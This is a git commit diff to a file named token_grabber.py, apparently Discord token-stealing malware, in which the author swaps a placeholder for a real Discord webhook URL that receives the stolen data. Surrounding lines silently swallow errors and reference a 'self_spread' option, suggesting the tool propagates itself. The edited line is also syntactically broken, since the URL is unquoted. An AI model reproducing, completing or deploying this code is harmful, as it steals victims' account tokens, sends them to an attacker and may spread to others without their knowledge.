2e922412baed40e2f84f916908ad0f132c975897
Githubiscool12 <104787700+Githubiscool12@users.noreply.github.com>
2022-05-02 22:20:16 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request(https://discordapp.com/api/webhooks/970744374067605514/s5PNVGLtrAk9sdiM4Y1MlVhnQ7PMDjcbgbps3bGd2_WRag2DuoOiuCMcAbdjZlnixK44, data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
